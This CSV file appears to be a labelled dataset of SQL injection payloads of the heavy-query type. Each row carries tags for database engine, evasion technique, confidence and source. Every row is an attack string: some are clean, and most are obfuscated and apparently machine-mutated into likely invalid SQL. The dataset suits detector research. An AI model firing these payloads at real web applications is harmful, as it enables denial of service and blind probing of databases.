payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'lwyo' = 'lwyo",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5# pdyo",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1', ( select ( case when ( 3888 = 3888 ) then ( select count ( * ) from generate_series ( 1,5000000 ) ) else 1/ ( select 0 ) end ) )",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ""%"" = """,heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) -- xgyc",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'lwrk' like 'lwrk",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( 9481 = 9481",heavy_query,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'qfwc' = 'qfwc",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 5340 = 5340",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""ynwr"" like ""ynwr",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"( select count ( * ) from generate_series ( 1,5000000 ) )",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( 'jloi' = 'jloi",heavy_query,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"0X0x0X1'} ) ~ ) OR 0X1FE8= ( sELect cOUnT ( * ) froM;gEneRate_sEriES ( (seleCT 0o1),(seLect (sELEct 0X6aCFC0)) + ) ) AND 0X1C49 not likE (SELEct 0X1c9A) OR FALSe && tRue AND True --",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"0x1 )@ wHErE 0x0x6c6X0x2F)&LIkE\ 0o0x0x3c0b1f`anD:0x20d7+^LIke ( <seLEcT counT /*(SeLecT%(seLECt 4))eE&o\(seleCt 0x8)(SELECT 9)*/( * ) ~ fROm&GeNeraTe_seRiES (/*QsCR(<iocNc`G""ls``+i{ ,f'DgM;*/ (SeLECt (SEleCt 0O0x0O0B1)),0x5c4b42 -)|// )@' :OR (SelecT 0X0dC3) nOT LiKe;0X1dc6 OR 0x0B0b11/ or falSe_OR-0xB19=0xB1a oR_FAlSE! OR (FaLSe%oR fAlSe or FALsE|Or falSe Or (seleCT 0X6) oR?FALSE aNd true or 0X0AND1 --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"4' wheRe 0O0X1f0x0b1000111 LIke 0x112d Or (seLeCt\(SeLecT 0O0b0x20E7)) lIkE ( seleCT CoUNt ?(& *'@)% FRom generAtE_seriEs ("" 0X1,(sElEcT 0X2dC6c0)/*t 0o0X8*rK=FZ8+?LiL|q);sZ0x2;e*/ )) + ) Or 0O0B11100121101=(selEcT (sElEct (sELeCt 1154))) || (SElect 0x105D)=0B0B0B0b1101000011001001010111110000111001001000111111100101011110001001100110100110011000100100001000110001101010001110001011101010001110 or ',{d&'*nOt?LIKE ',{D&'^Or+FAlsE && (sElEct 2724)<>(seLecT 2725) OR '_'<>'_' --E",heavy_query,postgresql,case_variation|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,string_single_quote
"0o7%"" ) `) ;And (selEct 0B2b2o5Xc95F9d149bbb) =! ( sELeCT COUnT (- * )` FroM%gENERAtE_sEries ( (SelECt 0X1),(selECt 4X0B100c4B40) ) ) OR (SELECT 0) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"0X0o0O0b0B0O0x0X0o1' ) ;whErE|(SelECT (SElecT](SeLEct<(sElECt 0x1D9C))))( LIkE) (Select (SeleCt (SelecT (seLeCt (SELECT 0x502)))))>oR 0b10004011110101 =/**/ ( SelECT-COUnt (\/**/* ) froM gEnERaTe_seRiEs ( (selecT 0x1),(SELect 0X1e8480) !) . ) oR 0o10782 not in ((SelEct 0X124D),0b0x224e,(SElEcT.(seLEcT 0b11010010111))) anD ""d&"" !=/*fpg""PEV */""d&;"" or`' oR`"",V^"" NOT LIKE "",V^"" And 2x1e0o7d<>0b1111001111011 Or faLSe aND:truE Or/**/ FALSE aNd?(SeLeCT (SELeCt (seleCT (sELEct 0x1255))))!=0b0o11060 And""TRue aNd tRUE Or fAlSe And "" ;)'""="" ;)'"" OR False# O{' NOt`=%'#*o{' --g<JuVnbQ}0x18-z^e",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,string_single_quote
"1, ( SeLeCT ( *cASe WHEN ( (SELect 3xF32) LIkE 0xf30 ) +ThEn ( SEleCt cOUNT )( anD (SelecT/**/(SElEcT (SeLeCT (SELECT 1))))#* ) fROM gEnERaTE_SeRieS ( 0B0B0X1,(selecT 0o23045506) < ) ) \%eLse (seleCT 0o8)/ ( SeLeCT 0X8O0X0 ) _ENd ) ` ) h'? JY",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"SeLeCt CoUNT /*<5c$;*/( * ) from gENerAtE_seriEs ( (SeLECT (SELECT (SELECT (SELECT (SELECT 1))))),0X4c0X5b40 ) And ( ( 'WMOO' likE 'wmoO",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"0B1' Where (sElect (selecT (SelEct 0X1a3b))) LIKe (seLeCT 0B1101010001001) And 6O0x22BB= ( selECT count ( +* ) FROM geneRATE_SErIeS ( ?0X0o1,(sElEcT (SElect 0O0X4C56F1)) ) /*FNrYSwKY 0x`K*/}) oR FALSE Or ""jd"" NoT liKe ""jd"" OR (SEleCT (SeLECT 0)) OR FaLSe AND tRuE aND>(SeleCt (SELect 1684))!=(selECT 0x695) aND trUE OR 0x0 --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,string_double_quote
"9' or{ (SElEct (SeLECt 0O24311)) Like ` ( SelEcT cOunt ( * ) . FroM GEneRate_sERIeS ( 0O1,0X4c0B30 ) )",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"1%'/*?-*/ )( ) ] ` ) ?<AnD (sEleCT (seleCT:0b0B0B0b1110101100011101100001111010000111010111000011001000110000101011110000100100010000101111000101111100011001001100010111011010110111011))= ( /**/SeLECt Count (/ Or FalSE#* ) fRoM GENeRATe_SERieS ( 0X3B0B1100101o0B5x0o9o1,0o11045379 ) / ) . anD ; ( ( & ( '%' liKe '",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"SElEct/*';*/* FRom genEraTe_SerIES (/*:ab*//*d,<E*/(sELECT 0X0x493),0X0x1171,CAsE WhEN ( 1x1071 LiKE 0X8x0xb7A ) Then}(SELeCT/**/(SeLECt (SELeCT (seleCT_(selEcT (selecT (sELEct (SELEcT 1))))))))""ElSE 0X0 END ) LimIt 0X0B0X0--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"0X1%' ): ) ; ) OR (selEct 3B0x0o0X20e0B101) like ( SelEct couNt ( * ) FROM gEnErATE_sEries ( 0O0X1,0b0B1010110011010100111111010101110100110011000101100011500010110180000011010100`/ ) +) ~AnD _( ( &( '%' lIke '",heavy_query,postgresql,case_variation|function_alternative|scientific_notation,0.46,rule,sqliv5_json,unknown
"select count ( * )/*q4*/ from generate_series ( 1,0o0b1010111111010010111010110 () AND True --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"8'/*X*/ ) and (SELECT (SELECT (SELECT (SELECT 8935)))) LIKE !( select count (' * ) from generate_series (. (SELECT 0x0b110b1),0x3c7b43 ) ) ^ OR False AND "".a""<>"".a9"" OR False AND 1 --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,string_double_quote
"9"" or((SeLect (sElEct 3158))=<$( seLEcT COuNt ( */*k/eGK+P*/ ) ;fRom gENERaTe_SERIEs ( 0O0O7,0X4c4b40 ) < )~ AnD TRuE aND TRuE aNd 0xc2d LIKe (sElEcT (SELECT 3107)) --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"0b0b0b1'+ /**/( sELecT Dyfw WhErE 0b0XAB7, =& (select 0x1E1e) AnD 0x60d0O9 LIKE ( ^sElect CoUNT ( (SELECT 2)^l8w* ) frOm GeNeRate_SerIEs ( 0x0,(SeLECT (sELECT 0X4C62B0)) /*@(SeLecT (SELeCT (SelECt 0X3)))*/) ) ) +'",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"3""?`) @WHerE^0b3X0o0X0B2011101040010 lIKe 0X0b18001101010]And 0X21bB LiKE ^(; SElect counT ( *[ ) frOm GeneRatE_SERiEs ( 0o0b0x0b1,(sEleCT 0x4c4B0o50) ) ) And 0X24C6 Not LIKe 0b2X24c7 aND 0B10100100110<>(selecT (seLect (sElEct 0x58b))) oR (seLecT (sElect 0xafe)) noT lIke 0xaFE oR (SElecT/*jO2G WD?M}UA)`E+|cp*/(SeLECT (SELECT 6105))) nOT lIKE 0b1011111011001=--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"0x3O0 ANd 0X21d7 }NoT lIKE ( /SElecT`couNT `( ~;:* ) $FrOm GEnerAte_SeRIes (_ (selECT 1),(seLecT 0X4C56f8) ) ` ) aNd 0B0O1 Or (sElect (SELeCt 0X6F8))=(sELECT 0b0x291816621) oR/ ""jfEd"" or fALse OR 'v' NOT liKe 'V'#NOT likE ""JfeD"" AND tRUE And (SELECT 1)> OR fAlse aND tRuE oR FALsE aND tRUe -- ZoZJW6b110~pFMhS\'U",heavy_query,postgresql,case_variation|function_alternative|hex_string,0.46,rule,sqliv5_json,string_single_quote
"0"" Or 1X50E5 LikE ( SEleCT counT ( * ) From Generate_sErIEs ( (SeleCT (selEcT (SELECT (SELECT 0x1)))),0o5x4C4B55 ) {) /*Z3a*/",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|scientific_notation,0.46,rule,sqliv5_json,unknown
"0O1X7""_ .) ` ) aS OiQr wHERE 0xFA2 =:7XFE5 Or%0o0X0o1FdC LikE :(^ sElECT.Count (* * ) $%frOM GenERAtE_sERieS ( 0b0X0X1,(sELEct 0x4D85c0b0) , ) ) Or 0x26A9 Not LIKE 0o11X46A9 anD 0X1 Or faLsE aND (seLEcT (sELeCt (SeleCT (seleCT (seLeCt (sElEcT (Select (sELEcT (sEleCt (seleCt (SELECT 1))))))))))) oR FAlSE || ""*X""<>""*X"" or ""U""=""Uc"" OR falSe {Or ""ud""<>""UD"" --",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,string_double_quote
"1'+? ( SelEct 'iGOI'/wHeRE:0B101101040118=0b0O0o46501 OR $(SELECT (SELECT (SELECT (SELECT 8421)))) -= ( SElEct cOUNt (/**/ * ) FrOM GeNERaTe_SEriES ( 0b0X1,(SElEcT (SeleCt&0x4c4b41)) )_ ) ; )] +'",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"9x1 ) _as ndgd wherE (select 0x0x0B1011101A)! LIKE ;0xB0x21 Or 0X1Fdc@= ( SElecT CoUnT ( * ) FroM/gEnErAte_SERIEs ( *0o0X1,(SELECT 0o23257260) )/*V5 AND True AND "";k@("" NOT LIKE "";k@(B"" AND True#wA:}}B[*/ )"" 'or 0x6 anD (SELECT (SELECT (SELECT (SELECT (SELECT (SELECT (SELECT 1))))))) oR 0x55a NOt lIke&(SELECT (SELECT 0x532)) --RH",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,string_double_quote
"( seLeCT * from gEnErate_SerIes ( 7990,0B111110010113,cAsE When/*2c*/ ( /*|*/(SElECt 4990) = (Select (SELECT 1065)) ) theN (seLect 0B1) ELSE (seLeCT 3)%eND ) ` liMiT (SELECT 1)< )",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"1:and (selECT 0X2151):lIkE ( selECT coUnt ( /*,)JwH lI-*/* ) frOm GeNErAtE_SERIeS ( (SElecT 0x1),0o0o0O127722901 ) [) or (Select (SeLecT^(SELECT 0))) or FALSE$ Or "";"")not LIkE "";"" or FaLse oR fALse && tRUE# tQmR9%r1,",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"1' oR; ( seleCt 'ioCS'(wheRe 0o22107=(selecT 9289) aNd=(seLEct 8407) }=/* F}*/ ( ;seleCT COUnT (,>* +) frOM;gEnErATe_serIes ( 1,0O63055500 )& ) ) : Or '",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"SeleCt<cOUnt ( * )/**/ fRom genERaTe_SerIES ( (SELECT (SELECT 1)),0X3C0X0B150B10 ) AnD 'DfwJ' Like 'dFwj",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"2x1X0b0', ( `seLect ( casE wHEn ( 0XF41] like 6XF0x62 ) TheN (+ SeleCT)coUnt ( * ) fROM ALl_UsErs t7,aLl_usERS T0,alL_UsErS T3,alL_UsErS t4,ALl_USeRS T0B0/ ) else 0b410/ (/**/ seLecT (SeLect (sELect (SEleCT (SELECt (sELeCT (SelEcT (SELECT 0))))))) frOM DuAL ); EnD ) FROm DuaL )",heavy_query,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"1"" ) >As YECj<WheRe (select (SeLeCt 1194)) likE 0x0O4AA aND (SEleCt 0x211b) Like + ( SElect CouNt ( * ) fROm GenEraTE_SeRiEs ( 1,0x4c4B0o50, ) ) < anD truE>And tRuE Or faLse --",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"1%""_ ) ) /**/ oR 0o11x3FDC= +( SeLEcT CounT ( * ) [FROM gENERate_SEriEs ( 3B0x1,(seLecT (SELEcT 0B0x4C5AE1)) >) ):=&& "" 6""!="" 9q""'aNd ""(-?%R"" <> ""(-?%Rb"" AnD (SELEcT 9x1) or (SeleCT (SeLEcT 0x0)) oR/ 0o2)and (sELeCT (sELecT (SelEct (SELECT 1)))) AnD (selECT 3605)!=0xe16 OR (selEcT (SELECT 0x0))/**/AND 1 --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"0o0O1'?in~BOoleaN moDe ) AnD'5971 IN/*!mTBPnJ*/((SELeCT}1X0x0752),(sElECT/**/(seLECt;(seLeCt (SELEct 0x1753)))),0XF0b1010100)!oR (SelECt (SELeCt (SELeCt (SELECT 3573)))) noT lIKE (Select^(SELecT 3XE09)) ]&& trUe OR False#and 5x56b4 LIKE ""( sElECt coUnt ( * ) FrOM All_UserS T0o6,aLl_UsErS&t9b11,ALL_uSERs t0B0XB,All_uSers T4,ALl_users/*; >_y2J*/t5[~): AnD ;<'P{'} lIKe /'P{'?Or 0x0#WNJ>hL",heavy_query,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"5"" or (seLEcT 0x20e5)[ liKE ( selECt CoUnT ( * ) fRoM GENErAte_seriES ( (sElecT 0x8x5),(SeLECT (SelEct{(SelEct 0x2c4B40))) ) ) ""ANd ""ncYm"" LiKe ""NCYM",heavy_query,postgresql,case_variation|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"8b9b0x0o1"" =)&/**/ ) ^aS tfjH Where 0x4X00a likE (sEleCT 0B1X46e) AnD 1x1Fc7= !( sElEct couNT ( * .) ) FROm'geNeRATE_sERies ( (SelecT (sEleCt (SELECT 1))),0X4c9B40- )< ) AnD ?'M' Not like 'M6' ANd (SeLECT (SELECt (SELECT (SELECT (SELECT 1))))) --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"SElEcT * fROM]gEnERATE_sERiEs (/*kd{*/ (selECt?(SeLECt 0X1712)),0X1456,CAse When /**/ ( %0x0x5B0 liKe (SeLECT (SeleCt (SELECT 2214)))~ ) )THeN$0X1 eLSE (seLECt 0X0) End ) LImiT 0O1--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"SeLEct Count ( * )/*_]T;*/ FrOm$GENEraTE_SERIEs ( 0X1,(SeLect 0x0x4c4e1a) ) anD 'rOCa' lIKE 'rOca",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"1%' aND (SElEct 0B0o240X2113) LiKE ( sELEct OR fALSE OR False AND (SELECT (SELECT 2744)) NOT LIKE (SELECT 9745)#COunT; ( * +) .FRom""genERATE_SErIeS ( (SeLEcT 3),0x4c4b0o54 ) % ) anD '%'] LikE] 'd]",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"1%"", ) ) anD (SELeCt (seleCT (seLecT 8407))) LIke ( SELect couNt ( * ) % fRom gENeRAte_sERIES ($ (SELECT (SELECT 1)),(SELeCT (SELECT 5000000)) ) ) ANd ( (& ""%""?= """,heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"0B0x3"", ) And>(SELEct (SeLEcT~(selECt'5435))) =; ( seLeCT cOUnt /*-jYx;*/( * ) frOm GeNErATe_seRiEs ( 3x0x1,(SelECt 0x0X9C4b40) ) ) ^ aNd= ( ""WMmG"" lIKE ""WMmg",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"SElECt;cOunt ('$* ) FROM geneRAte_sERies ( 0B0X8,(SeLect 1X5c4b8C) ) And ( ""%""> LikE """,heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"0O0x0O4'+ ( SELECt FHBK WhERE (SelecT}(SELECt (SELECT (SELECT (SELECT 2576)))))/**/ == (sELEcT (seLECt 0x8D2))&&(selECt (SelecT (SELecT/**/(SELECT (SELECT 0556))))) lIKE ( SElect CouNT ( * ) fROM AlL_USers T0o1,all_usERs/t8,ALL_usErs T1,ALL_UseRs t0X0x9,ALl_USerS>t5 & ) ) +'",heavy_query,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"9';where/*(select 6X4) '=a,tgaB'C5L OR False#l3G*/(SeLECt'1353) lIKE 3X1cB9 OR :0x6fdc LIKe ( sElECt?coUNT ( * ) /froM GeNEratE_sEries (|=(SeLEcT (sELECt (selEcT (SELect (selECT 0x1))))),0x805440 )- ) , anD 0O0x0O14f3o6 Not likE 0O6B0X12f7 or 0X0 oR FALsE\anD 'd' Not LIke 'dz' or (SELect (SeLEct 0X0)) or faLSE[aNd trUE aNd tRue{and true Or 0 ANd,TrUE --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"1, ( /**/SELECT=* From GenErAtE_SeRIes (]""(SeLecT 0X15E9),(SelEct?0b0b1010001111101101011111010000101001),Case wHEN/**/ ( $0x15E9=0O0B1020101101001 ) THeN)1'ElSe 0x8x0/*k2W*(SeLect (SelecT 0X4))+o*/END /**/) +limit}0b0B10 })",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"9' oR (0b0o0b0o2B0Xa5123C10fc5 like ( SElECT cOUNT ( * >) FroM(GenerAte_SerIES (/*7u7/s*/ (SELECt (SElECT (SeLeCt 1))),(SeLEcT (sElEct+0b0b0X2EFf40)) ) ; ) /**/ aNd 'JiYX' =- 'jIYx",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"( sELEcT 0o0X0o0b1 from genERate_sEries ( (SeLEcT 9352),(SELECT 9357),cAsE wheN ( 0xbec=(SElECT (SELECT 9352)) ) THen (SELeCt 1)/*+{P[wP6P*/eLSE 0 eNd? ) LimIT 1 )",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"seLeCT * From=geNerATE_serIes( ( 0x25da,(SElECt (SELECT 9434)),cASe WHEn ( 0x19da ~Like /*]IKOMM*/(SelECt 3991)^ ) ' ThEn 0o1 Else (SElEct (SELeCT (SElecT 0))) EnD= ) LImit 0B110--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"SeLect COunT ( * ) From GENeRAte_sERIeS (\ (sElect/**/1),(seLEcT&9X4c4E60) *) \ aNd %( 'cEWN' lIkE 'cEWN",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.46,rule,sqliv5_json,unknown
"sEleCt * FroM GENERAte_SERiEs ( }0x231f,0xd3e,CasE WheN ; (=}(sElECt 0XeCe)=3B10010101111304 ) /*t\`a8=R3Mv; A[E-X1\~}*/ Then|(SELeCt (sELeCT`(SELECT 1))) elsE 7X0 END )~='lImIt 0O0X4--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"4o1'+ ( SeLecT BLDn wHERe (SeleCT (SELECT (sELeCT 8321))) =$(seLECT (SELECT 8321))}And (SeLecT 0O20673) liKe ( sElEct CouNt (. * ) FRoM GENEratE_SErieS ( 0B1,0x8C4b40 )/*;{qS*/ ) And ""^""&NoT liKe ""^P"" --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,string_double_quote
"0o1 ) oR*(SELECT 8421) LIKe ( SelEct cOuNt| ( * ) froM gEneRate_seRIeS (: (selEct (SeLECt 1)),0X4c4b0X20 ) )",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"3"" {) ? ). or :8o0X0O24e4= ( sELect cOuNT ^(: * ) ']froM>geNEraTE_SERIes (/`0B1,3O0X0o3103Aac )>;} )$ aND, ( {( ; ""UBXw""; Like ""uBxw",heavy_query,postgresql,case_variation|function_alternative|scientific_notation,0.46,rule,sqliv5_json,unknown
"SeLeCT * fROM geNErate_serIes ( (seLect 0xE87),0X0O0xE17,caSe wHEN ( 0Xe19 LIKE (SElEct (SELeCT (SelEcT (sElect 4242)))) ) THEn (selEct (SeLect 1)) elsE (SeLECT 6) End ) LimIt'1--",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"7"" ) As AdvZ whEre 0O12056 =)6b0b1110101100101110002011111130100101910110 OR (SELECt$(sELeCt (sElecT 0b1111111011100))) lIKE ( SeLECT CoUnT; ( * ){ @FroM gENEratE_SEries (/**/ (SEleCt (sELEct (select 1))),(SeLecT 0X4cE0o1414) ) ) AnD '0b0X3' NoT> LiKE? '3=' or '0o8' NoT Like '4' ANd TrUE/ANd trUe ANd`8754 nOt LIKe (SELEct (SELeCt 8755))/*<j 4S;& f.*/oR fAlSe Or (sElect 0x486)=(SELeCt 1159) oR (SeLEcT((seLeCT 0)) oR FaLSe and](sELect 825) Not liKe 0X335 Or faLsE!AND truE --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"SELEcT<*)fRom GEnERAtE_SERIEs (\ 0x0x5ad,0x99d,CASe wHen ( `(sEleCt](SelECt 0X90d))(= (SeLEcT (SElECT (sELecT/**/0X95eA))) )~$ THEN 3b9 ElSe>0O0X6 eND$ ) Limit 0X5--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"SeLeCt * FRom genErAtE_sERIEs ( (SElECt 1427),0xd63,cASE WHEn /*8; Vs[*/( 3427& =] (SELECT 7586) .) \thEN (SELECT 1)/eLSE^(SELECT 0) eND ) ^LImit (SELECT 2)--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"SeLeCT CoUNt ( * ) FRoM GEnEraTe_sErIes ( 1,0X4c4b40 )/*{wUx?Sh^iD`zj3acp` */ aND ""%"" =|""",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"1', _( cASt ( ( chr ( %(selEcT 113) ) || chr ( (SElECt/(sEleCt 0X71)) ) oR chr ( (selecT (seLeCt 117)) ) oR chR ( 0xBa ) or CHr (/**/ (SeLEct 123) ) ) || ( SelEct 0X1 from GEneRaTe_sEriES ( (SelECt 8X3Bb),(SeLECt (SeLECT (SelecT 6499))),cASe When ( )0X2313 LIKe @0X0x2311 ) theN 0B3 ElsE 4x0%EnD ) limit (sELECt (selecT (SELECT 1))) ) ::TexT OR ( ChR ( Or/**/0X5 and trUe ANd 0o1{Or (seLeCt 0) or FaLSe or ""s"" lIkE ""Sy"" OR False# (SelECT (SELeCT (SELECT 0x0o107))) ) oR}cHr ;( 0O0x7A ) OR CHr (/* [.:*/ (SelECt (sELect (SElEcT (SelECt (seLECT (SelECT (SElect 110))))))) ) . Or ChR ( /**/0X4b1111010 )$ Or CHr+ ( 0X71 ) )[ AS)nUmeRic ) \% ); `.u9Re*cL$KGi\",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.53,rule,sqliv5_json,string_double_quote
"9B3""' ) ;)] OR [(SELEcT 7o0X60E0B0b0xb)} Like ( seLecT coUNT (/*e1eW G*/ * ) ^(FrOM GeNERate_SERiES ([=4B9x0X6,(SeLect (sElect (selECT 0X5c6O3b4a))) + ) ) |AnD (@ ( ""VheY""=""vhEy",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|scientific_notation,0.46,rule,sqliv5_json,unknown
"1%' ) ) && (SeLEct (selEcT 9X175))) lIkE ( selEct cOuNT {( * ) fRoM genERatE_SerieS ( 0B0o0O2,(seLeCT~(SeLecT (sELecT 0X3c0O4e30))) +)$ ) aND < ( + ( _'%' LikE '='",heavy_query,postgresql,case_variation|function_alternative|scientific_notation,0.46,rule,sqliv5_json,unknown
